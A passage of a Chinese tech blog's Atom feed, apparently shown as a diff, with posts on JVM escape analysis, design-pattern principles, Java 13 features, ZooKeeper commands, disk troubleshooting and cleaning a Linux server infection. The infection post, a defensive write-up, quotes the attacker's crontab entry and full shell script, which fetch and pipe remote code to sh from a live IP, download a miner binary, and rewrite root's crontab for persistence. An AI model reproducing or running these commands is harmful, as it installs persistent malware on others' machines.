0.493ms[0.160s][info][gc] GC(10) Pause Young (Normal) (G1 Evacuation Pause) 6M-&gt;1M(10M) 0.475ms[0.162s][info][gc] GC(11) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.433ms[0.164s][info][gc] GC(12) Pause Young (Normal) (G1 Evacuation Pause) 6M-&gt;1M(10M) 0.447ms[0.165s][info][gc] GC(13) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.466ms[0.167s][info][gc] GC(14) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.412ms[0.168s][info][gc] GC(15) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.462ms[0.169s][info][gc] GC(16) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.527ms[0.171s][info][gc] GC(17) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.512ms[0.173s][info][gc] GC(18) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.456ms[0.174s][info][gc] GC(19) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.445ms[0.176s][info][gc] GC(20) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.469ms[0.177s][info][gc] GC(21) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.465ms[0.179s][info][gc] GC(22) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.471ms[0.180s][info][gc] GC(23) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.415ms[0.182s][info][gc] GC(24) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.389ms[0.183s][info][gc] GC(25) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.400ms[0.185s][info][gc] GC(26) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.378ms[0.186s][info][gc] GC(27) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.373ms[0.187s][info][gc] GC(28) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.324ms[0.189s][info][gc] GC(29) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.354ms[0.190s][info][gc] GC(30) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.391ms[0.192s][info][gc] GC(31) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.410ms[0.193s][info][gc] GC(32) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.382ms[0.195s][info][gc] GC(33) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.325ms[0.196s][info][gc] GC(34) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.417ms[0.197s][info][gc] GC(35) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.373ms[0.199s][info][gc] GC(36) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.418ms[0.200s][info][gc] GC(37) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.323ms[0.202s][info][gc] GC(38) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.364ms[0.203s][info][gc] GC(39) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.396ms[0.204s][info][gc] GC(40) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.341ms[0.206s][info][gc] GC(41) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.370ms73ms</code></pre><p>共耗时73ms,比开启逃逸分析慢了6倍.</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;逃逸分析&quot;&gt;&lt;a href=&quot;#逃逸分析&quot; class=&quot;headerlink&quot; title=&quot;逃逸分析&quot;&gt;&lt;/a&gt;逃逸分析&lt;/h2&gt;&lt;p&gt;Java对象一般都是在堆中分配内存,但是也不一定,jvm做了一些优化,将一些对象通过逃逸分析,直接在栈上分配.也就少了内存拷
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="JVM" scheme="http://www.hasfun.cn/tags/JVM/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>聊聊设计模式的本质</title>
+    <link href="http://www.hasfun.cn/2020/06/08/design-pattern/"/>
+    <id>http://www.hasfun.cn/2020/06/08/design-pattern/</id>
+    <published>2020-06-08T09:31:43.000Z</published>
+    <updated>2020-11-04T12:32:28.781Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="什么是设计模式？"><a href="#什么是设计模式？" class="headerlink" title="什么是设计模式？"></a>什么是设计模式？</h2><p>设计模式就是前人总结的代码设计的模型，就像武侠里面的武功的招式，套路。</p><p>为什么需要设计模式啊？我平时代码敲的也没有问题啊，功能也完成了，线上跑的很健康</p><h3 id="1、统一编程风格"><a href="#1、统一编程风格" class="headerlink" title="1、统一编程风格"></a>1、统一编程风格</h3><p>实现功能，这属于硬编码，没有什么技巧，形成不了模式，只能说是个copyer，复制人。大部分代码都是cv的。不能称得上工程师，你敲的代码不能成为工程级别的项目。可能你写的代码只能你自己看得懂，如果你的命名不规范的化，就会形成自己的一套代码风格。</p><h3 id="2、易维护，行内统一语言"><a href="#2、易维护，行内统一语言" class="headerlink" title="2、易维护，行内统一语言"></a>2、易维护，行内统一语言</h3><p>如果你使用设计模式，大家的代码风格统一了，大家都有了共识，理解代码的结构也很轻松，不过这里有个大前提，就是你的团队，都懂设计模式。</p><h3 id="3、代码更优雅"><a href="#3、代码更优雅" class="headerlink" title="3、代码更优雅"></a>3、代码更优雅</h3><p>设计模式，让你的代码更优雅，比如建造者模式</p><pre><code>HttpClient.builder().url(&quot;&lt;http://aliserver/api/user/query&gt;&quot;)        .method(Method.GET)        .parameter(Map.of(&quot;uuid&quot;, &quot;432231&quot;, &quot;key&quot;, &quot;di2da2ddsa3s&quot;))        .build();</code></pre><h3 id="4、可扩展性强，轻松应对多变需求"><a href="#4、可扩展性强，轻松应对多变需求" class="headerlink" title="4、可扩展性强，轻松应对多变需求"></a>4、可扩展性强，轻松应对多变需求</h3><p>设计模式，可以让代码写的复用性好，可扩展性强。说白了，就是面对多变的需求，你可以改动很少的代码就能适应新需求，就像汽车的部件一样，代码功能块就像汽车部件了，拆拆装装，就产生新的新特的汽车。这样的代码，老板喜欢，因为节省开发成本，减少人力；深受同行吹捧，因为这已经成为工匠打磨的作品。</p><p>怎么使用设计模式<br>从我学习设计模式的经验，记住概念，记住类图 ，很容易忘记，容易混淆各个设计模式。后来发现，记住设计模式的本质是很重要的，让围绕这个本质，再去看这些设计模式，比较容易吸收点。</p><p><strong>设计模式的目标：让代码，维护成本低，面对多变需求，可扩展性强.</strong></p><p><strong>设计模式的本质：面向抽象，隔离实现</strong></p><p>用白话解释就是，设计模式都是抽象类，接口来组织代码关系，实现层都是被隐藏的，也就是隐藏细节，面向抽象层。<br><strong>那么为什么要面向抽象，隔离实现呢？</strong></p><p><strong>因为抽象是稳定的,实现层是具体的细节，是多变的。</strong></p><p>举个例子，用户登录注册这样的需求，抽象出来，就是用户服务：userService，有login（），register（）。然后我们提测，测试经过数天的功能测试，回归测试，生产验证，功能发布成功，</p><p>这是不变的方法吧。如果要来了一个微信登录这些细节的时候，那么user这个类就不稳定了。所以我们设计成abstract userService，wxUserService，qqUserService。</p><p>可以做到面对多变需求，动态扩展，不需要修改原有的类，避免了维护原有类，测试原有功能的工作量。</p><p>然后为了“面向抽象，隔离实现”这个目标，先人提出了设计原则</p><p>我们开发一个订单系统的项目，经过需求评审，代码实现，单元测试，功能测试，线上运行，投入了很多的人力成本，才交出了stabale稳定的代码。</p><p>现在需要添加一个功能，作为老板，或者管理人员，我们希望不要修改原有功能模块的代码，这样增加了回归已有功能的工作量，也增加了线上原有功能影响的风险，所以期望只在原有基础扩展现有功能。</p><p>这里，就得提到，开发程序要符合<strong>开闭原则，做到不修改，只扩展。</strong></p><p>要做到开闭原则，就得引出设计原则：<strong>单一职责</strong>，我们定义的类的功能边界要明确，职责清晰，这样面对多变的需求变动的可能性就小，比如下单功能，orderService只负责订单的创建订单，修改订单功能，如果还参杂着的物流信息的功能，下次如果物流功能变更，就会牵扯到订单功能。</p><p>上面我们提到了，抽象是稳定的，实现是多变的，所以引出了<strong>依赖倒置</strong>的原则，我们定义的类与类之间，是通过抽象层产生关系，抽象层不依赖实现类，实现类要依赖抽象层，体现了“面向抽象，隔离实现”</p><p>还有<strong>接口隔离原则</strong>，接口的实现类，不要实现跟自己无关的抽象方法，类的继承也要做到尽可能少的继承与自己无关的方法，这样做也是为了减少上层的变动影响了下层。</p><p>在程序开发中，类与类之间肯定会产生关系，就难免产生耦合，类之间关系越复杂，牵涉到某功能变动，就会影响，不符合开闭原则，所以我们约定类与类之间尽可能少的产生依赖关系，只与自己直接关系的类有依赖关系，这也就是<strong>迪米特法则</strong>，也就是最小知道原则，</p><p>类的继承，是强耦合的东西，给程序带入了侵入型，基类的方法，被子类继承，如果继承的方法发生变更，子类功能都会受影响，所以我们约定了 子类继承基类，只能继承原有方法，新增新的功能方法，不得重写父类的功能方法，这就是<strong>里氏替换原则：出现基类的地方，子类能替换。</strong></p><p><strong>合成复用原则：少用继承，多用合成，依赖关系</strong>，为了减少耦合的可能性。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遵守了上面提到了设计原则，我们的代码健壮性更强，可扩展性也更好，减少了代码的出错率。<br>设计模式，就是基于上述的7大原则，形成的一套招式，其中比较典型的就是桥梁模式。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;什么是设计模式？&quot;&gt;&lt;a href=&quot;#什么是设计模式？&quot; class=&quot;headerlink&quot; title=&quot;什么是设计模式？&quot;&gt;&lt;/a&gt;什么是设计模式？&lt;/h2&gt;&lt;p&gt;设计模式就是前人总结的代码设计的模型，就像武侠里面的武功的招式，套路。&lt;/p&gt;
+&lt;p&gt;为什么
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="设计模式" scheme="http://www.hasfun.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux服务器病毒查杀经过</title>
+    <link href="http://www.hasfun.cn/2019/12/16/linux-virus/"/>
+    <id>http://www.hasfun.cn/2019/12/16/linux-virus/</id>
+    <published>2019-12-16T03:22:47.000Z</published>
+    <updated>2020-11-04T12:32:28.781Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>手上一个阿里云的服务器，最近发现CPU占用率飙高，有190.7%，影响了服务器的性能。 top一下系统的进程占用情况，发现有个不知名的进程Donald一直占用CPU，将进程杀死，还有执行程序删除后，过段时间，执行程序又会自动生成，并且自动启动了，当时推测有个定时任务自动去其他服务器自动下载可执行病毒程序。装了iftop软件检测异常网络流量，无果。最后推测是否这个病毒是否存在一个守护进程在检测和生成这个可执行病毒程序，结果是解决了这个病毒。</p><pre><code>[root@izuf63bc56k6c8viz98bd1z ~]# top  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                                                       32448 root      20   0  304956 268232   1476 S 190.7  6.9   4:05.54 Donald</code></pre><p>第一次排查系统中毒，问题比较棘手，花了2天，解决了。特此记录下，方便后续参考。</p><h1 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h1><ol><li><p>查询进程的执行程序</p><pre><code> [root@izuf63bc56k6c8viz98bd1z ~]# cd /proc/32448 [root@izuf63bc56k6c8viz98bd1z 32448]# ll lrwxrwxrwx  1 root root 0 Dec 15 01:21 exe -&gt; /tmp/Donald</code></pre><p>可以看到这个可以病毒的执行程序是Donald，位于/tmp 下。</p></li><li><p>杀死可疑进程 在top执行结果界面中，按K，输入32448，再enter下，即是kill -9 32448的效果。</p></li></ol><p><img src="/images/top.png" alt="top命令"></p><ol><li><p>再删除病毒程序</p><p>[root@izuf63bc56k6c8viz98bd1z 11770]# rm -rf /tmp/Donald</p></li><li><p>过段时间，又会生成/tmp/Danold ,开始定位原因。</p></li></ol><p>①crontab任务</p><pre><code>[root@izuf63bc56k6c8viz98bd1z ~]# crontab -l -u root*/15 * * * * (/usr/bin/yvqbfa8||/usr/libexec/yvqbfa8||/usr/local/bin/yvqbfa8||/tmp/yvqbfa8||curl -m180 -fsSL &lt;http://218.93.239.148:5071/i.sh||wget&gt; -q -T180 -O- &lt;http://218.93.239.148:5071/i.sh&gt;) | sh</code></pre><p>可以看见有个crontab任务在执行下载，读了一下，好像跟Donald无关。读了一下<a href="http://218.93.239.148:5071/i.sh下载的文件，" target="_blank" rel="noopener">http://218.93.239.148:5071/i.sh下载的文件，</a></p><pre><code>export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbinmkdir -p /var/spool/cron/crontabsecho &quot;&quot; &gt; /var/spool/cron/rootecho &quot;*/15 * * * * (/usr/bin/gewqfa8||/usr/libexec/gewqfa8||/usr/local/bin/gewqfa8||/tmp/gewqfa8||curl -fsSL -m180 &lt;http://218.93.239.148:5071/i.sh||wget&gt; -q -T180 -O- &lt;http://218.93.239.148:5071/i.sh&gt;) | sh&quot; &gt;&gt; /var/spool/cron/rootcp -f /var/spool/cron/root /var/spool/cron/crontabs/rootcd /tmptouch /usr/local/bin/writeable &amp;&amp; cd /usr/local/bin/touch /usr/libexec/writeable &amp;&amp; cd /usr/libexec/touch /usr/bin/writeable &amp;&amp; cd /usr/bin/rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeableexport PATH=$PATH:$(pwd)ps auxf | grep -v grep | grep gewqfa8 || rm -rf gewqfa8if [ ! -f &quot;gewqfa8&quot; ]; then    curl -fsSL -m1800 &lt;http://218.93.239.148:5071/static/4008/ddgs.$&gt;(uname -m) -o gewqfa8||wget -q -T1800 &lt;http://218.93.239.148:5071/static/4008/ddgs.$&gt;(uname -m) -O gewqfa8fichmod +x gewqfa8/usr/bin/gewqfa8||/usr/libexec/gewqfa8||/usr/local/bin/gewqfa8||/tmp/gewqfa8ps auxf | grep -v grep | grep gewqbcb | awk &#39;{print $2}&#39; | xargs kill -9ps auxf | grep -v grep | grep gewqbcc | awk &#39;{print $2}&#39; | xargs kill -9ps auxf | grep -v grep | grep gewqbcd | awk &#39;{print $2}&#39; | xargs kill -9ps auxf | grep -v grep | grep gewqbce | awk &#39;{print $2}&#39; | xargs kill -9ps auxf | grep -v grep | grep gewqfa0 | awk &#39;{print $2}&#39; | xargs kill -9ps auxf | grep -v grep | grep gewqfa1 | awk &#39;{print $2}&#39; | xargs kill -9ps auxf | grep -v grep | grep gewqfa2 | awk &#39;{print $2}&#39; | xargs kill -9ps auxf | grep -v grep | grep gewqfa3 | awk &#39;{print $2}&#39; | xargs kill -9ps auxf | grep -v grep | grep gewqfa4 | awk &#39;{print $2}&#39; | xargs kill -9echo &quot;*/15 * * * * (/usr/bin/gewqfa8||/usr/libexec/gewqfa8||/usr/local/bin/gewqfa8||/tmp/gewqfa8||curl -m180 -fsSL &lt;http://218.93.239.148:5071/i.sh||wget&gt; -q -T180 -O- &lt;http://218.93.239.148:5071/i.sh&gt;) | sh&quot; | crontab -</code></pre><p>源码大概意思是，下载一个ddgs.x86_32 文件另存为 gewqfa8,执行gewqfa8生成yvqbfa8进程，会在tmp生成Donald执行程序，如果没有则会创建并且执行。很狡猾这个黑客，进程名换了几个，我vi gewqfa8 和 Donald 想读下病毒是怎么写的，可是源码被混淆了，黑客这样做是为了躲过一些杀毒软件的查杀吧。</p><p>②可疑守护进程yvqbfa8</p><pre><code>[root@izuf63bc56k6c8viz98bd1z ~]# topPID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                                                       32448 root      20   0  304956 268232   1476 S 190.7  6.9   4:05.54 Donald31906 root      20   0  185484 109744   208  S 31.6   2.8   2:56.30 yvqbfa8[root@izuf63bc56k6c8viz98bd1z bin]# kill -9 31906</code></pre><p>再观察已经没有再生成Donald程序了。回头分析一下crontab任务，每15s执行下/usr/local/bin/yvqbfa8，yvqbfa8这个文件有点猫腻，可是vi 出来是乱码，是shell脚本被黑客混淆了，目前没找到方案解混淆。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>kill 病毒进程，删除crontab任务，删除执行文件gewqfa8，Donald</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;手上一个阿里云的服务器，最近发现CPU占用率飙高，有190.7%，影响了服务器的性能。 top一下系统的进程占用情况，发现有个不知名的进程D
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Linux" scheme="http://www.hasfun.cn/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>jdk13新特性</title>
+    <link href="http://www.hasfun.cn/2019/12/11/jdk13-new-feature/"/>
+    <id>http://www.hasfun.cn/2019/12/11/jdk13-new-feature/</id>
+    <published>2019-12-11T08:48:52.000Z</published>
+    <updated>2020-11-04T12:32:28.781Z</updated>
+    
+    <content type="html"><![CDATA[<p>2019年09月17日，JCP如期半年一更的约定，jdk迎来了新的版本jdk13.这里记录下新特性中比较亮眼的2个特性，方便后续查阅。详细的新特性参考<a href="https://openjdk.java.net/projects/jdk/13/" target="_blank" rel="noopener">jdk13</a>。 </p><ul><li>text block 省去了很多转义</li></ul><pre><code class="java">   @Test    public void textBlock(){       String sql = &quot;&quot;&quot;                select * from system_user                where user_id = &#39;543255&#39;                and age &gt;12                and birth&gt;&#39;1991&#39;        &quot;&quot;&quot;;        String html = &quot;&quot;&quot;  ..............&lt;html&gt;  ..............    &lt;body&gt;  ..............        &lt;p&gt;Hello, world&lt;/p&gt;  ..............    &lt;/body&gt;  ..............&lt;/html&gt;  ..............&quot;&quot;&quot;;        System.out.println(html);        System.out.println(sql);    }</code></pre><ul><li><p>增强switch,支持yield设置返回</p><pre><code class="Java">  /**   * jdk12   * @throws IOException   */  @Test  public void switchFeature() throws IOException {      switch (&quot;A&quot;) {          case &quot;A&quot; -&gt; System.out.println(&quot;you is A&quot;);          case &quot;B&quot; -&gt; System.out.println(&quot;you is B&quot;);      }  }  /**   * jdk13   * @throws IOException   */  @Test  public void switchFeature2() throws IOException {      String a = &quot;A&quot;;     var result =  switch (a) {         case &quot;A&quot; :yield &quot;1&quot;;         case &quot;B&quot;: yield &quot;2&quot;;         default:             throw new IllegalStateException(&quot;Unexpected value: &quot; + a);     };     System.out.println(result);  }</code></pre></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;2019年09月17日，JCP如期半年一更的约定，jdk迎来了新的版本jdk13.这里记录下新特性中比较亮眼的2个特性，方便后续查阅。详细的新特性参考&lt;a href=&quot;https://openjdk.java.net/projects/jdk/13/&quot; target=&quot;_b
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Java新特性" scheme="http://www.hasfun.cn/tags/Java%E6%96%B0%E7%89%B9%E6%80%A7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>查询dubbo服务在zookeeper的部署情况</title>
+    <link href="http://www.hasfun.cn/2019/11/27/zookeeper-command/"/>
+    <id>http://www.hasfun.cn/2019/11/27/zookeeper-command/</id>
+    <published>2019-11-27T04:41:11.000Z</published>
+    <updated>2020-11-04T12:32:28.785Z</updated>
+    
+    <content type="html"><![CDATA[<p>公司没有部署dubbo的admin界面，只能学会去生产机器用命令行排查问题。故做下记录，以便后续排查问题使用。</p><p>先进到zk的服务器，在shell里面敲命令，进入zk的命令界面</p><pre><code class="shell">[test@FZ-KAFKA-61-72 bin]$ ./zkCli.sh -server 127.0.0.1:2181</code></pre><p>然后，会出现 </p><pre><code class="shell">Connecting to 127.0.0.1:2181.....Welcome to ZooKeeper![zk: 127.0.0.1:2181(CONNECTED) 0]</code></pre><p>接下来，就可以查询dubbo服务的节点了</p><pre><code class="shell">[zk: 127.0.0.1:2181(CONNECTED) 0] ls /[brokers, zookeeper, dubbo, consumers, config]</code></pre><p>查询dubbo服务的所有暴露的服务接口</p><pre><code class="shell">[zk: 127.0.0.1:2181(CONNECTED) 0] ls /dubbo[com.hcw.user.provider.api.service.UserAccountDubboService]</code></pre><p>查询某个服务的提供者与消费者的注册情况</p><pre><code class="shell">[zk: 127.0.0.1:2181(CONNECTED) 0] ls  /dubbo/com.hcw.user.provider.api.service.UserAccountDubboService/providers[dubbo%3A%2F%2F192.168.61.99%3A20891%2Fcom.hcw.api.QSearchService%3Fanyhost%3Dtrue%26application%3Desh-provider%26dubbo%3D2.5.3%26interface%3Dcom.hcw.api.QSearchService%26logger%3Dslf4j%26methods%3DfindStockDoc%26pid%3D18460%26revision%3D0.0.2-SNAPSHOT%26side%3Dprovider%26threads%3D100%26timestamp%3D1572509354829][zk: 127.0.0.1:2181(CONNECTED) 0] ls    /dubbo/com.hcw.user.provider.api.service.UserAccountDubboService/consumers[consumer%3A%2F%2F192.168.61.114%2Fcom.hcw.api.QService%3Fapplication%3Dexam-consumer%26category%3Dconsumers%26check%3Dfalse%26dubbo%3D2.5.3%26interface%3Dcom.hcw.api.QSearchService%26logger%3Dslf4j%26methods%3DfindDocument%2Cf]</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;公司没有部署dubbo的admin界面，只能学会去生产机器用命令行排查问题。故做下记录，以便后续排查问题使用。&lt;/p&gt;
+&lt;p&gt;先进到zk的服务器，在shell里面敲命令，进入zk的命令界面&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;[test@FZ-KAFK
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="dubbo" scheme="http://www.hasfun.cn/tags/dubbo/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux磁盘不足排查过程</title>
+    <link href="http://www.hasfun.cn/2019/10/23/no-space-left-on-device/"/>
+    <id>http://www.hasfun.cn/2019/10/23/no-space-left-on-device/</id>
+    <published>2019-10-23T06:32:23.000Z</published>
+    <updated>2020-11-04T12:32:28.785Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天，群里面有人@我服务挂了，群里都是公司那些老资格的大佬，心里一揪，还好是开发环境。我故作镇定的说，我看看，我打开Linux服务器，shell里面敲了服务状态命令，的确是挂了。于是我先重启，报错提示no space left on device。看这意思是没有空间了，不知道是内存没有空间了还是磁盘没有空间了，英语不好，于是只能轮流试一下</p><pre><code class="shell">[root@storm bin] free -m             total       used       free     shared    buffers     cachedMem:         7983        4943       3039          0     132        183-/+ buffers/cache:       4628       3354Swap:         2015       1409       606</code></pre><p>可见内存还剩3G。排除了内存，十有八九是磁盘了。于是敲下命令</p><pre><code class="shell">[root@storm bin] df -hFilesystem            Size  Used Avail Use% Mounted on/ttt/pda1              47G   47G   0M  100% /</code></pre><p>的确是磁盘满了，那么是哪里的文件占用了大量的磁盘空间呢?估计是应用日志。还是敲命令定位一下,因/为我们服务放在/opt/app下，所以从这个目录找起</p><pre><code class="shell">[root@storm bin] du -sh /opt/app |grep G38G /opt/app[root@storm bin] du -sh /opt/app/* |grep G20G /opt/app/message_plateform11G /opt/app/question-h-cache</code></pre><p>到此，占据内存的罪魁祸首找到了。磁盘总共47G，message_plateform，question-h-cache这2个服务就占据了31G。联系系统owner解决掉。那么问题来了，如何防止此类问题？</p><p>第一个就是运维写个脚步本，定期清理过期日志文件；</p><p>第二个logback提供自动压缩归档日志文件，自动清除旧的日志归档文件。</p><p>另外，可能出现磁盘空间足够，导致文件生成失败还有另一个原因，就是文件索引节点inode已满</p><pre><code class="shell">[root@storm bin] df -iFilesystem                    Inodes   IUsed  IFree IUse% Mounted on/dev/mapper/dev01-root       4964352 4964352      0  100% /udev                          503779     440 503339    1% /devtmpfs                         506183     353 505830    1% /runnone                          506183       5 506178    1% /run/locknone                          506183       2 506181    1% /run/shm/dev/sda1                     124496     255 124241    1% /boot</code></pre><p>inodes 占用100%</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;今天，群里面有人@我服务挂了，群里都是公司那些老资格的大佬，心里一揪，还好是开发环境。我故作镇定的说，我看看，我打开Linux服务器，shell里面敲了服务状态命令，的确是挂了。于是我先重启，报错提示no space left on device。看这意思是没有空间了，不知
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Linux" scheme="http://www.hasfun.cn/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>利用IDEA批量重命名</title>
+    <link href="http://www.hasfun.cn/2019/10/10/cleanbadnaming/"/>
+    <id>http://www.hasfun.cn/2019/10/10/cleanbadnaming/</id>
+    <published>2019-10-10T02:47:44.000Z</published>
+    <updated>2020-11-04T12:32:28.781Z</updated>
+    
+    <content type="html"><![CDATA[<p>写代码需要有匠心，对于命名规范，作为一个逼格程序员的重要素质。工欲善其身，必先利其器，IDEA提供了Spellchecker检测错误命名的提示，当我们看到如下绿色波浪线，这是在提示需要修改不友好的命名了。</p><p><img src="/images/cleancode.png" alt="绿色波浪线"></p><p>那么如果我们敲了很久的代码，才发现某些变量不规范，而很多地方引用的话。如何利用idea批量修改变量名呢。今天才意识到idea提供的rename功能，</p><pre><code>选中修改对象： shift + F6</code></pre><p>然后会发现，选中的code被一个红框圈起来了，</p><p><img src="/images/cleancode2.png" alt="红框圈"></p><p>这时将新的名字输入，然后回车，文件中所有该变量的名字就都被修改好了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;写代码需要有匠心，对于命名规范，作为一个逼格程序员的重要素质。工欲善其身，必先利其器，IDEA提供了Spellchecker检测错误命名的提示，当我们看到如下绿色波浪线，这是在提示需要修改不友好的命名了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/cleancode
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="IDEA技巧" scheme="http://www.hasfun.cn/tags/IDEA%E6%8A%80%E5%B7%A7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Java7,8,9,10,11,12新特性</title>
+    <link href="http://www.hasfun.cn/2019/09/30/java-procee/"/>
+    <id>http://www.hasfun.cn/2019/09/30/java-procee/</id>
+    <published>2019-09-30T05:54:58.000Z</published>
+    <updated>2020-11-04T12:32:28.781Z</updated>
+    
+    <content type="html"><![CDATA[<p>Java9之后，JCP执行委员会提出将Java的发布频率改为每六个月一次。现在Java已经更新到Java 12了，可是我还停留在Java8上，不得不感慨程序员要保持学习，才能不会被淘汰啊。</p><hr><table><thead><tr><th>版本</th><th>发布时间</th><th>特性</th></tr></thead><tbody><tr><td>Java7</td><td>2011年7月28日</td><td>NIO，捕获多个异常，jcmd替代jps，fork/join，Java Mission Control（类似JVisualVm），Files</td></tr><tr><td>Java8</td><td>2014年3 月18日</td><td><strong>Lambda 表达式</strong> − Lambda允许把函数作为一个方法的参数（函数作为参数传递进方法中），<strong>Stream API</strong>，<strong>HashMaps性能提升（红黑树）</strong>，<strong>Date Time API</strong>，StampedLock，<strong>Optional</strong>，<strong>默认方法</strong> − 默认方法就是一个在接口里面有了一个实现的方法；<strong>方法引用</strong> − 方法引用提供了非常有用的语法，可以直接引用已有Java类或对象（实例）的方法或构造器。与lambda联合使用，方法引用可以使语言的构造更紧凑简洁，减少冗余代码；<strong>Nashorn, JavaScript 引擎</strong> − Java 8提供了一个新的Nashorn javascript引擎，它允许我们在JVM上运行特定的javascript应用；<strong>静态方法</strong> </td></tr><tr><td>Java9</td><td>2017年9 月22日</td><td><strong>模块系统</strong>：模块是一个包的容器，Java 9 最大的变化之一是引入了模块系统（Jigsaw 项目），<strong>REPL (JShell)</strong>：交互式编程环境；G1成为默认垃圾回收器，<strong>HTTP 2 客户端</strong>，同时改进httpclient的api，支持异步模式，jshell，docker方面支持，集合工厂方法（list,map,set）加入of，<strong>改进的 Javadoc</strong>：Javadoc 现在支持在 API 文档中的进行搜索。另外，Javadoc 的输出现在符合兼容 HTML5 标准；<strong>私有接口方法</strong>：在接口中使用private私有方法。我们可以使用 private 访问修饰符在接口中编写私有方法。<strong>轻量级的 JSON API</strong>：内置了一个轻量级的JSON API；<strong>响应式流（Reactive Streams) API</strong>: Java 9中引入了新的响应式流 API 来支持 Java 9 中的响应式编程；<strong>进程 API</strong>: 改进的 API 来控制和管理操作系统进程。引进 java.lang.ProcessHandle 及其嵌套接口 Info 来让开发者逃离时常因为要获取一个本地进程的 PID 而不得不使用本地代码的窘境。 </td></tr><tr><td>Java10</td><td>2018年3 月21日</td><td>局部变量类型推断支持var 局部变量，GC改进，线程本地握手</td></tr><tr><td>Java11</td><td>2018年9 